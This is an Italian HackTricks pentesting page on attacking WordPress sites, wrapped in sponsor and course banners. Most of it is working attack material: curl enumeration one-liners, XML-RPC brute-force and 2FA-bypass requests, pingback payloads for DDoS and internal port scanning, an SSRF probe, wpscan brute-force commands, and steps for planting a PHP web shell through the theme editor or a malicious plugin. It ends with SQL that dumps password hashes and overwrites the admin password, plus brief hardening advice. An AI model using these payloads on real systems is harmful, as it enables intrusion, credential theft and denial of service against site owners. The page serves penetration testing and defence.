# Wordpress

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e **automatizzare flussi di lavoro** supportati dagli strumenti comunitari pi√π avanzati al mondo.\
Ottieni l'accesso oggi stesso:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Informazioni di base

I file **caricati** vanno a: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`\
I file **dei temi possono essere trovati in /wp-content/themes/**, quindi se modifichi qualche file php del tema per ottenere RCE probabilmente userai quel percorso. Ad esempio: Utilizzando il **tema twentytwelve** puoi **accedere** al file **404.php** in: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)\
**Un'altra URL utile potrebbe essere:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

In **wp-config.php** puoi trovare la password di root del database.

Percorsi di accesso predefiniti da verificare: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **File principali di WordPress**

* `index.php`
* `license.txt` contiene informazioni utili come la versione di WordPress installata.
* `wp-activate.php` viene utilizzato per il processo di attivazione dell'email durante la configurazione di un nuovo sito WordPress.
* Cartelle di accesso (possono essere rinominate per nasconderle):
* `/wp-admin/login.php`
* `/wp-admin/wp-login.php`
* `/login.php`
* `/wp-login.php`
* `xmlrpc.php` √® un file che rappresenta una funzionalit√† di WordPress che consente di trasmettere dati con HTTP agendo come meccanismo di trasporto e XML come meccanismo di codifica. Questo tipo di comunicazione √® stato sostituito dalla [REST API](https://developer.wordpress.org/rest-api/reference) di WordPress.
* La cartella `wp-content` √® la directory principale in cui vengono memorizzati plugin e temi.
* `wp-content/uploads/` √® la directory in cui vengono memorizzati i file caricati sulla piattaforma.
* `wp-includes/` Questa √® la directory in cui vengono memorizzati i file principali, come certificati, font, file JavaScript e widget.
* `wp-sitemap.xml` Nelle versioni di Wordpress 5.5 e successive, Wordpress genera un file XML della mappa del sito con tutti i post pubblici e i tipi di post e tassonomie pubblicamente interrogabili.

**Post exploitation**

Il file `wp-config.php` contiene informazioni richieste da WordPress per connettersi al database, come il nome del database, l'host del database, il nome utente e la password, le chiavi di autenticazione e i salt, e il prefisso della tabella del database. Questo file di configurazione pu√≤ anche essere utilizzato per attivare la modalit√† DEBUG, che pu√≤ essere utile per la risoluzione dei problemi.

### Permessi degli utenti

* **Amministratore**
* **Editor**: Pubblica e gestisce i suoi post e quelli degli altri
* **Autore**: Pubblica e gestisce i propri post
* **Contributore**: Scrive e gestisce i propri post ma non pu√≤ pubblicarli
* **Subscriber**: Sfoglia i post e modifica il proprio profilo

## **Enumerazione passiva**

### **Ottenere la versione di WordPress**

Verifica se puoi trovare i file `/license.txt` o `/readme.html`

All'interno del **codice sorgente** della pagina (esempio da [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

* grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
* `meta name`

![](<../../.gitbook/assets/image (343).png>)

* File di collegamento CSS

![](<../../.gitbook/assets/image (344).png>)

* File JavaScript

![](<../../.gitbook/assets/image (346).png>)

### Ottieni Plugin

{% code overflow="wrap" %}
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Ottenere Temi

{% code overflow="wrap" %}
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Estrarre le versioni in generale

{% code overflow="wrap" %}
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilizza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare facilmente e **automatizzare flussi di lavoro** supportati dagli strumenti della community pi√π avanzati al mondo.\
Ottieni l'accesso oggi stesso:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Enumerazione attiva

### Plugin e Temi

Probabilmente non sarai in grado di trovare tutti i Plugin e Temi possibili. Per scoprirli tutti, dovrai **forzare attivamente una lista di Plugin e Temi** (fortunatamente per noi ci sono strumenti automatizzati che contengono queste liste).

### Utenti

**ID Brute**

Puoi ottenere utenti validi da un sito WordPress forzando gli ID degli utenti:
```
curl -s -I -X GET http://blog.example.com/?author=1
```
Se le risposte sono **200** o **30X**, significa che l'id √® **valido**. Se la risposta √® **400**, allora l'id √® **non valido**.

**wp-json**

Puoi anche provare a ottenere informazioni sugli utenti effettuando una query:
```
curl http://blog.example.com/wp-json/wp/v2/users
```
Un altro endpoint `/wp-json/` che pu√≤ rivelare informazioni sugli utenti √®:
```
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Nota che questo endpoint espone solo gli utenti che hanno pubblicato un post. Verranno fornite solo informazioni sugli utenti che hanno questa funzionalit√† abilitata.

Nota anche che **/wp-json/wp/v2/pages** potrebbe rivelare gli indirizzi IP.

#### Enumerazione del nome utente di accesso

Quando si accede a **`/wp-login.php`**, il **messaggio** √® **diverso** se il **nome utente indicato esiste o meno**.

### XML-RPC

Se `xml-rpc.php` √® attivo, √® possibile eseguire un attacco di forza bruta alle credenziali o utilizzarlo per lanciare attacchi DoS ad altre risorse. (√à possibile automatizzare questo processo [utilizzando questo](https://github.com/relarizky/wpxploit), ad esempio).

Per verificare se √® attivo, prova ad accedere a _**/xmlrpc.php**_ e invia questa richiesta:

**Verifica**
```markup
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Bruteforce delle credenziali**

**`wp.getUserBlogs`**, **`wp.getCategories`** o **`metaWeblog.getUsersBlogs`** sono alcuni dei metodi che possono essere utilizzati per il bruteforce delle credenziali. Se riesci a trovarne uno, puoi inviare qualcosa del genere:
```markup
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Il messaggio _"Nome utente o password non corretti"_ all'interno di una risposta con codice 200 dovrebbe apparire se le credenziali non sono valide.

![](<../../.gitbook/assets/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (4).png>)

![](<../../.gitbook/assets/image (102).png>)

Utilizzando le credenziali corrette √® possibile caricare un file. Nella risposta verr√† visualizzato il percorso ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```markup
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Inoltre, c'√® un **modo pi√π veloce** per forzare le credenziali utilizzando **`system.multicall`** in quanto √® possibile provare diverse credenziali nella stessa richiesta:

<figure><img src="../../.gitbook/assets/image (188).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Questo metodo √® pensato per i programmi e non per gli esseri umani, ed √® obsoleto, quindi non supporta l'autenticazione a due fattori (2FA). Quindi, se hai credenziali valide ma l'accesso principale √® protetto da 2FA, **potresti essere in grado di abusare di xmlrpc.php per effettuare il login con quelle credenziali bypassando 2FA**. Nota che non sarai in grado di eseguire tutte le azioni che puoi fare tramite la console, ma potresti comunque essere in grado di ottenere RCE come spiega Ippsec in [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s)

**DDoS o scansione delle porte**

Se riesci a trovare il metodo _**pingback.ping**_ nell'elenco, puoi fare in modo che Wordpress invii una richiesta arbitraria a qualsiasi host/porta.\
Questo pu√≤ essere utilizzato per chiedere a **migliaia** di siti Wordpress di **accedere** a una **posizione** specifica (causando un **DDoS** in quella posizione) oppure puoi usarlo per fare **scansioni** di una rete interna di Wordpress (puoi indicare qualsiasi porta).
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../.gitbook/assets/1\_JaUYIZF8ZjDGGB7ocsZC-g.png)

Se ottieni **faultCode** con un valore **maggiore** di **0** (17), significa che la porta √® aperta.

Dai un'occhiata all'uso di **`system.multicall`** nella sezione precedente per imparare come abusare di questo metodo per causare un DDoS.

**DDoS**
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../.gitbook/assets/image (103).png>)

### wp-cron.php DoS

Questo file di solito si trova nella root del sito Wordpress: **`/wp-cron.php`**\
Quando questo file viene **accessato**, viene eseguita una query MySQL "**pesante**", quindi potrebbe essere utilizzato dagli **attaccanti** per **causare** un **DoS**.\
Inoltre, per impostazione predefinita, il `wp-cron.php` viene chiamato ad ogni caricamento della pagina (ogni volta che un client richiede una qualsiasi pagina Wordpress), il che su siti ad alto traffico pu√≤ causare problemi (DoS).

Si consiglia di disabilitare Wp-Cron e creare un vero cronjob all'interno dell'host che esegua le azioni necessarie ad intervalli regolari (senza causare problemi).

### /wp-json/oembed/1.0/proxy - SSRF

Prova ad accedere a _https://sito-wordpress.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ e il sito Wordpress potrebbe inviarti una richiesta.

Questa √® la risposta quando non funziona:

![](<../../.gitbook/assets/image (184) (1).png>)

### SSRF

{% embed url="https://github.com/t0gu/quickpress/blob/master/core/requests.go" %}

Questo strumento controlla se il **methodName: pingback.ping** e il percorso **/wp-json/oembed/1.0/proxy** esistono e, se esistono, cerca di sfruttarli.

### Strumenti Automatici
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilizza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e automatizzare facilmente flussi di lavoro supportati dagli strumenti della community pi√π avanzati al mondo.\
Ottieni l'accesso oggi stesso:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Ottieni l'accesso sovrascrivendo un bit

Pi√π che un vero attacco, questa √® una curiosit√†. Nel CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) potevi invertire 1 bit in qualsiasi file di WordPress. Quindi potevi invertire la posizione `5389` del file `/var/www/html/wp-includes/user.php` per annullare l'operazione NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modifica di un file php del tema utilizzato (sono necessarie le credenziali di amministratore)**

Aspetto ‚Üí Editor del tema ‚Üí Modello 404 (a destra)

Modifica il contenuto per inserire uno shell php:

![](<../../.gitbook/assets/image (21) (1) (1).png>)

Cerca su internet come puoi accedere a quella pagina aggiornata. In questo caso devi accedere qui: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Puoi utilizzare:
```
use exploit/unix/webapp/wp_admin_shell_upload
```
## Plugin RCE

### Plugin PHP

Potrebbe essere possibile caricare file .php come plugin.\
Crea il tuo backdoor php utilizzando ad esempio:

![](<../../.gitbook/assets/image (407).png>)

Quindi aggiungi un nuovo plugin:

![](<../../.gitbook/assets/image (409).png>)

Carica il plugin e premi Installa ora:

![](<../../.gitbook/assets/image (411).png>)

Clicca su Procedi:

![](<../../.gitbook/assets/image (412).png>)

Probabilmente questo non far√† nulla apparentemente, ma se vai su Media, vedrai il tuo shell caricato:

![](<../../.gitbook/assets/image (413).png>)

Accedilo e vedrai l'URL per eseguire il reverse shell:

![](<../../.gitbook/assets/image (414).png>)

### Caricamento e attivazione di un plugin malevolo

Questo metodo prevede l'installazione di un plugin malevolo noto per essere vulnerabile e che pu√≤ essere sfruttato per ottenere una web shell. Questo processo viene eseguito tramite il pannello di controllo di WordPress nel seguente modo:

1. **Acquisizione del plugin**: Il plugin viene ottenuto da una fonte come Exploit DB come [**qui**](https://www.exploit-db.com/exploits/36374).

2. **Installazione del plugin**:
- Vai al pannello di controllo di WordPress, quindi vai su `Dashboard > Plugin > Carica Plugin`.
- Carica il file zip del plugin scaricato.

3. **Attivazione del plugin**: Una volta che il plugin √® stato installato con successo, deve essere attivato tramite il pannello di controllo.

4. **Sfruttamento**:
- Con il plugin "reflex-gallery" installato e attivato, pu√≤ essere sfruttato poich√© si sa che √® vulnerabile.
- Il framework Metasploit fornisce uno sfruttamento per questa vulnerabilit√†. Caricando il modulo appropriato ed eseguendo comandi specifici, √® possibile stabilire una sessione meterpreter, concedendo l'accesso non autorizzato al sito.
- Si nota che questo √® solo uno dei molti metodi per sfruttare un sito WordPress.

Il contenuto include aiuti visivi che mostrano i passaggi nel pannello di controllo di WordPress per l'installazione e l'attivazione del plugin. Tuttavia, √® importante notare che sfruttare vulnerabilit√† in questo modo √® illegale ed eticamente scorretto senza l'autorizzazione adeguata. Queste informazioni dovrebbero essere utilizzate in modo responsabile e solo in un contesto legale, come i test di penetrazione con un permesso esplicito.


**Per ulteriori dettagli sui passaggi, consulta: [https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)**


## Post Esploitation

Estrai nomi utente e password:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Cambiare la password dell'amministratore:

To change the admin password in WordPress, follow these steps:

1. Log in to the WordPress admin dashboard using your current admin credentials.
2. Go to the "Users" section in the left-hand menu.
3. Click on the "All Users" option.
4. Locate the admin user in the list and click on the "Edit" link below their username.
5. Scroll down to the "Account Management" section.
6. Enter a new password in the "New Password" field.
7. Confirm the new password by entering it again in the "Repeat New Password" field.
8. Click on the "Update User" button to save the changes.

Now, the admin password has been successfully changed. Remember to use a strong and unique password to enhance the security of your WordPress site.
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Protezione di WordPress

### Aggiornamenti regolari

Assicurarsi che WordPress, i plugin e i temi siano aggiornati. Inoltre, verificare che l'aggiornamento automatico sia abilitato in wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Inoltre, **installa solo plugin e temi WordPress affidabili**.

### Plugin di sicurezza

* [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
* [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
* [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Altre raccomandazioni**

* Rimuovi l'utente predefinito **admin**
* Utilizza **password forti** e **2FA**
* Revisiona periodicamente i **permessi** degli utenti
* **Limita i tentativi di accesso** per prevenire attacchi di forza bruta
* Rinomina il file **`wp-admin.php`** e permetti l'accesso solo internamente o da determinati indirizzi IP.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilizza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e automatizzare facilmente flussi di lavoro con gli strumenti comunitari pi√π avanzati al mondo.\
Ottieni l'accesso oggi stesso:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF**, controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository GitHub di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
